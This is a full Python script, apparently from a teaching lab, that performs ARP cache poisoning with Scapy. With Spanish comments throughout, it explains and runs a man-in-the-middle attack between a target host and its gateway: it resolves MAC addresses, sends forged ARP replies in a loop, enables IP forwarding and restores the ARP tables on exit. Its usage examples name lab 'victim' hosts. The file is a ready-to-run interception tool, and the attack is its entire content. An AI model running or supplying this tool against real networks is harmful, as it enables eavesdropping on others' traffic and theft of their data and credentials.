#!/usr/bin/env python3
"""
=============================================================================
ARP Spoofing (ARP Cache Poisoning) - Ataque Man-in-the-Middle
=============================================================================
Este script realiza un ataque ARP Spoofing usando Scapy para posicionarse
como Man-in-the-Middle (MITM) entre dos hosts de la red.

COMO FUNCIONA:
  1. El atacante envia paquetes ARP Reply falsos a ambos objetivos
  2. Cada objetivo actualiza su tabla ARP con la MAC del atacante
  3. Todo el trafico entre los objetivos pasa por el atacante
  4. El atacante reenvio los paquetes (IP forwarding) para no romper la conexion

EJEMPLO DE USO:
  # MITM entre victim1 y gateway
  python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.2

  # MITM entre victim3 y gateway (interceptar reportes periodicos)
  python3 arp_spoof.py -t 172.20.0.12 -g 172.20.0.2

  # Especificar interfaz de red
  python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.2 -i eth0

REQUISITOS:
  - Privilegios root (NET_ADMIN + NET_RAW)
  - IP forwarding habilitado (net.ipv4.ip_forward=1)
  - Scapy instalado
=============================================================================
"""

import argparse
import os
import sys
import time
import signal
from scapy.all import Ether, ARP, sendp, srp, get_if_hwaddr, conf


def get_mac(ip, iface, timeout=2):
    """
    Obtiene la MAC real de un host enviando un ARP Request.

    Construye un paquete ARP Who-has:
      Ether(dst="ff:ff:ff:ff:ff:ff")  -> Broadcast L2 (todos lo reciben)
      ARP(pdst=ip)                    -> Pregunta: "Quien tiene esta IP?"

    Retorna la MAC del host que responde.
    """
    # =========================================================================
    # Paquete ARP Request (broadcast)
    # =========================================================================
    # Capa 2 - Ethernet
    #   dst = "ff:ff:ff:ff:ff:ff"  -> Direccion MAC broadcast (todos reciben)
    #   type = 0x0806              -> EtherType ARP (automatico por Scapy)
    #
    # Capa 2.5 - ARP
    #   op = 1 (who-has)           -> Operacion: ARP Request
    #   pdst = ip                  -> IP del host que buscamos
    #   hwsrc = nuestra MAC        -> MAC del que pregunta (auto-detectada)
    #   psrc = nuestra IP          -> IP del que pregunta (auto-detectada)
    # =========================================================================
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=ip)

    print(f"[*] Resolviendo MAC de {ip}...")
    result = srp(pkt, iface=iface, timeout=timeout, verbose=False)[0]

    if result:
        mac = result[0][1].hwsrc
        print(f"[+] {ip} -> {mac}")
        return mac
    else:
        print(f"[!] No se pudo resolver la MAC de {ip}")
        sys.exit(1)


def spoof(target_ip, target_mac, spoof_ip, iface):
    """
    Envia un ARP Reply falso al target diciendole que la IP de spoof_ip
    esta asociada a NUESTRA MAC (la del atacante).

    Esto envenena la tabla ARP del target:
      Antes:  spoof_ip -> MAC_real_del_gateway
      Despues: spoof_ip -> MAC_del_atacante

    El target enviara su trafico destinado a spoof_ip hacia nosotros.
    """
    # =========================================================================
    # Paquete ARP Reply FALSO (el corazon del ataque)
    # =========================================================================
    # Capa 2 - Ethernet
    #   dst = target_mac           -> Solo el target recibe este paquete
    #   src = nuestra MAC          -> MAC del atacante (auto por Scapy)
    #
    # Capa 2.5 - ARP
    #   op = 2 (is-at)             -> Operacion: ARP Reply
    #   pdst = target_ip           -> IP del host que queremos engañar
    #   hwdst = target_mac         -> MAC real del host objetivo
    #   psrc = spoof_ip            -> IP que estamos suplantando (MENTIRA)
    #   hwsrc = nuestra MAC        -> Nuestra MAC (Scapy la pone automatico)
    #
    # RESULTADO: El target cree que spoof_ip esta en nuestra MAC
    # =========================================================================
    pkt = Ether(dst=target_mac) / ARP(
        op="is-at",        # ARP Reply
        pdst=target_ip,    # A quien va dirigido el engaño
        hwdst=target_mac,  # MAC real del objetivo
        psrc=spoof_ip      # IP que estamos suplantando (LA MENTIRA)
        # hwsrc se omite -> Scapy usa nuestra MAC real automaticamente
    )
    sendp(pkt, iface=iface, verbose=False)


def restore(target_ip, target_mac, source_ip, source_mac, iface):
    """
    Restaura la tabla ARP del target enviando un ARP Reply con la MAC real.
    Se ejecuta al terminar el ataque para no dejar la red rota.

    Envia 5 paquetes para asegurar que la tabla ARP se actualice correctamente.
    """
    # =========================================================================
    # Paquete ARP Reply LEGITIMO (restauracion)
    # =========================================================================
    # Diferencia con spoof(): aqui hwsrc = MAC real del host suplantado
    # Esto repara la tabla ARP del target
    # =========================================================================
    pkt = Ether(dst=target_mac) / ARP(
        op="is-at",
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac    # MAC REAL (no la nuestra)
    )
    sendp(pkt, iface=iface, count=5, verbose=False)


def enable_ip_forward():
    """Habilita IP forwarding para reenviar paquetes interceptados."""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP forwarding habilitado")


def disable_ip_forward():
    """Deshabilita IP forwarding al terminar."""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[-] IP forwarding deshabilitado")


def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing MITM - Envenena tablas ARP entre dos hosts",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # MITM entre victim1 y gateway
  python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.2

  # MITM entre victim3 y gateway (capturar reportes)
  python3 arp_spoof.py -t 172.20.0.12 -g 172.20.0.2

  # Todos los victims a la vez (ejecutar en terminales separadas)
  python3 arp_spoof.py -t 172.20.0.10 -g 172.20.0.2 &
  python3 arp_spoof.py -t 172.20.0.11 -g 172.20.0.2 &
  python3 arp_spoof.py -t 172.20.0.12 -g 172.20.0.2 &
        """
    )
    parser.add_argument("-t", "--target", required=True,
                        help="IP del host objetivo (victim)")
    parser.add_argument("-g", "--gateway", required=True,
                        help="IP del gateway/router")
    parser.add_argument("-i", "--interface", default="eth0",
                        help="Interfaz de red (default: eth0)")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="Intervalo entre paquetes ARP en segundos (default: 2)")
    args = parser.parse_args()

    print("=" * 60)
    print("  ARP Spoofing - Man in the Middle Attack")
    print("=" * 60)
    print(f"  Target:    {args.target}")
    print(f"  Gateway:   {args.gateway}")
    print(f"  Interface: {args.interface}")
    print(f"  Intervalo: {args.interval}s")
    print("=" * 60)

    # Obtener nuestra MAC
    our_mac = get_if_hwaddr(args.interface)
    print(f"[*] Nuestra MAC: {our_mac}")

    # Resolver MACs reales de los objetivos
    target_mac = get_mac(args.target, args.interface)
    gateway_mac = get_mac(args.gateway, args.interface)

    # Habilitar IP forwarding (necesario para no cortar la comunicacion)
    enable_ip_forward()

    # Contador de paquetes enviados
    pkt_count = 0

    # Manejar Ctrl+C para restaurar tablas ARP antes de salir
    def signal_handler(sig, frame):
        print(f"\n[!] Deteniendo ataque... ({pkt_count} paquetes enviados)")
        print("[*] Restaurando tablas ARP...")
        restore(args.target, target_mac, args.gateway, gateway_mac, args.interface)
        restore(args.gateway, gateway_mac, args.target, target_mac, args.interface)
        disable_ip_forward()
        print("[+] Tablas ARP restauradas. Saliendo.")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print(f"\n[*] Envenenando tablas ARP... (Ctrl+C para detener)\n")

    try:
        while True:
            # Envenenar al target: "El gateway soy yo"
            spoof(args.target, target_mac, args.gateway, args.interface)
            # Envenenar al gateway: "El target soy yo"
            spoof(args.gateway, gateway_mac, args.target, args.interface)

            pkt_count += 2
            print(f"\r[*] Paquetes ARP enviados: {pkt_count}", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        signal_handler(None, None)


if __name__ == "__main__":
    main()
